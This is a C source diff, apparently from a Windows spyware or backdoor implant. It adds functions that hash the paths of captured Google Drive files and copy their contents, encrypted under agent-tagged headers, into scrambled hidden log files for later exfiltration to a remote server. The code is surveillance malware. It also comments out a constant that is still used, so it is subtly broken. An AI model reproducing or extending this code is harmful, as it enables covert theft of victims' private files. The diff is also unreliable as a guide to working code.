@@ -15,6 +15,8 @@
 #include "DeepFreeze.h"
 #include "format_resistant.h"
 
+#include "Social\Handler_GDrive.h"
+
 extern BOOL IsDriverRunning(WCHAR *driver_name);
 extern char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
 
@@ -49,7 +51,7 @@ typedef struct _LogStruct{
 }LogStruct, *pLogStruct;
 
 #define NO_TAG_ENTRY 0xFFFFFFFF
-#define MAX_LOG_ENTRIES 70
+//#define MAX_LOG_ENTRIES 70
 #define MIN_CREATION_SPACE 307200 // Numero di byte che devono essere rimasti per creare ancora nuovi file di log
 log_entry_struct log_table[MAX_LOG_ENTRIES];
 
@@ -1872,4 +1874,196 @@ BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall
 void LOG_CloseLogConnection()
 {
 	ASP_Stop();
+}
+
+
+//========================================= CLOUD FILE FUNCTIONS =======================================================
+
+
+BOOL Log_CryptCopyCloudFile(PGD_FILE pFile, char *dest_file_path, WCHAR *display_name, DWORD agent_tag)
+{
+	HANDLE hdst;
+	BY_HANDLE_FILE_INFORMATION dst_info;
+	DWORD existent_file_size = 0;
+	DWORD dwRead;
+	BYTE *temp_buff;
+	BYTE *file_additional_data;
+	BYTE *log_file_header;
+	FileAdditionalData *file_additiona_data_header;
+	DWORD header_len;
+	WCHAR *to_display;
+
+	if (display_name)
+		to_display = display_name;
+	else
+		to_display = pFile->pwszFileName;
+
+	//create the file header
+	if(!(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
+		return FALSE;
+	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
+	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
+	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
+	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
+	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
+	SAFE_FREE(file_additional_data);
+	if (!log_file_header)
+		return FALSE;
+	
+	//get dest file info (if existing)
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hdst != INVALID_HANDLE_VALUE) {
+		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
+			existent_file_size = dst_info.nFileSizeLow;
+		}
+		CloseHandle(hdst);
+	}
+
+	if(!(temp_buff = (BYTE *)malloc(CRYPT_COPY_BUF_LEN)) ) {
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+
+	//check availability of disk space
+	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
+		SAFE_FREE(temp_buff);
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
+	if (hdst == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(log_file_header);
+		SAFE_FREE(temp_buff);
+		return FALSE;
+	}
+
+	//if the file has been overwritten successfully, return the amout of freed disk space
+	log_free_space += existent_file_size;
+
+	//write the file header
+	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
+		CloseHandle(hdst);
+		SAFE_FREE(log_file_header);
+		SAFE_FREE(temp_buff);
+		return FALSE;
+	}
+	if (log_free_space >= header_len)
+		log_free_space -= header_len;
+	SAFE_FREE(log_file_header);
+	FNC(FlushFileBuffers)(hdst);
+
+	
+	DWORD dwChunkSize = CRYPT_COPY_BUF_LEN;
+
+	//loop until it can read from source and write to dest
+	for(int i=0; i<pFile->dwFileSize; i+=dwChunkSize)
+	{
+		if((i+dwChunkSize) > pFile->dwFileSize)		
+			dwChunkSize = pFile->dwFileSize - i;
+		
+		//copy the file chunk into the tmp buffer
+		memcpy_s(temp_buff, CRYPT_COPY_BUF_LEN, &pFile->pcFileBuf[i], dwChunkSize);
+
+		//encrypt and write to dest file
+		if (!Log_WriteFile(hdst, temp_buff, dwChunkSize))
+			break;
+	}
+
+	SAFE_FREE(temp_buff);
+	CloseHandle(hdst);
+	return TRUE;
+}
+
+
+//copy the file (with hashed path) in the hidden folder
+//overwrite the destination file, if present
+//copy the file only if the dest file date is different than the source file date
+BOOL Log_CopyCloudFile(PGD_FILE pFile, WCHAR *display_name, BOOL empty_copy, DWORD agent_tag)
+{	
+	//BY_HANDLE_FILE_INFORMATION src_info, dst_info;
+	char red_fname[100];
+	char log_wout_path[_MAX_FNAME];
+	char dest_file_path[DLLNAMELEN];
+	char dest_file_mask[DLLNAMELEN];
+	char *scrambled_name;
+	nanosec_time src_date, dst_date;
+	FILETIME time_nanosec;
+	//SYSTEMTIME system_time;
+	WIN32_FIND_DATA ffdata;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+	
+	//check the file dimension
+	if(pFile->dwFileSize == 0) 
+		return FALSE;
+	
+	//hashes the file path in red_fname
+	SHA1Context sha;
+	SHA1Reset(&sha);
+	SHA1Input(&sha, (const unsigned char *)pFile->pwszFileName, (DWORD)(wcslen(pFile->pwszFileName)*2));
+	if(!SHA1Result(&sha)) 
+		return FALSE;
+
+	memset(red_fname, 0, sizeof(red_fname));
+	for(int i=0; i<(SHA_DIGEST_LENGTH/sizeof(int)); i++) 
+		sprintf(red_fname+(i*8), "%.8X", sha.Message_Digest[i]);
+
+	//search a file with the same hashed name
+	_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "?LOGF%.4X%s*.log", agent_tag, red_fname);
+	if(!(scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE))) 
+		return FALSE;
+	HM_CompletePath(scrambled_name, dest_file_mask);
+	SAFE_FREE(scrambled_name);
+
+	hFind = FNC(FindFirstFileA)(dest_file_mask, &ffdata);
+	if(hFind != INVALID_HANDLE_VALUE)
+	{
+		//...se l'ha gia' catturato usa il vecchio nome
+		HM_CompletePath(ffdata.cFileName, dest_file_path);
+		FNC(FindClose)(hFind);
+	}
+	else
+	{
+		// ...altrimenti gli crea un nome col timestamp attuale
+		FNC(GetSystemTimeAsFileTime)(&time_nanosec);
+		//FNC(SystemTimeToFileTime)(&system_time, &time_nanosec);	
+		_snprintf_s(log_wout_path, sizeof(log_wout_path), _TRUNCATE, "%.1XLOGF%.4X%s%.8X%.8X.log", log_active_queue, agent_tag, red_fname, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
+		if ( ! (scrambled_name = LOG_ScrambleName2(log_wout_path, crypt_key[0], TRUE)) ) 
+			return FALSE;	
+		HM_CompletePath(scrambled_name, dest_file_path);
+		SAFE_FREE(scrambled_name);
+	}
+
+	/*
+	// Prende le info del file destinazione (se esiste)
+	hfile = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hfile != INVALID_HANDLE_VALUE) {
+		if (!FNC(GetFileInformationByHandle)(hfile, &dst_info)) {
+			CloseHandle(hfile);
+			return FALSE;
+		}
+		CloseHandle(hfile);
+
+		// Compara le date dei due file (evita riscritture dello stesso file)
+		src_date.hi_delay = src_info.ftLastWriteTime.dwHighDateTime;
+		src_date.lo_delay = src_info.ftLastWriteTime.dwLowDateTime;
+		dst_date.hi_delay = dst_info.ftLastWriteTime.dwHighDateTime;
+		dst_date.lo_delay = dst_info.ftLastWriteTime.dwLowDateTime;
+		if(!IsGreaterDate(&src_date, &dst_date)) 
+			return FALSE;
+	}
+		
+	//log an empty file if the size is > than max_size
+	if (empty_copy) {
+		if (!Log_CryptCopyEmptyFile(src_path, dest_file_path, display_name, src_info.nFileSizeLow, agent_tag)) 
+			return FALSE;
+		return TRUE;
+	}
+	*/
+
+	// Effettua la vera copia.
+	if(!Log_CryptCopyCloudFile(pFile, dest_file_path, display_name, agent_tag)) 
+		return FALSE;
+
+	return TRUE;
 }
